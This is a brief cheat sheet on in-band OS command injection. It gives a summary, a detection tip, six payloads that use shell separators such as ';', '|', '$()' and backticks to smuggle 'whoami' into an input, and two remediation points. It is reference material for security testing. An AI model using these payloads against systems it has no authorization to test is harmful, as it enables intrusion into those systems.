# In-Band Command Injection

## Summary
Execute OS commands with output visible in the response.

## Detection
Add command separators and observe output.

## Payloads

```
; whoami
| whoami
$(whoami)
`whoami`
|| whoami
& whoami
```

## Remediation
- Avoid system calls with user input
- Input whitelist, not blacklist
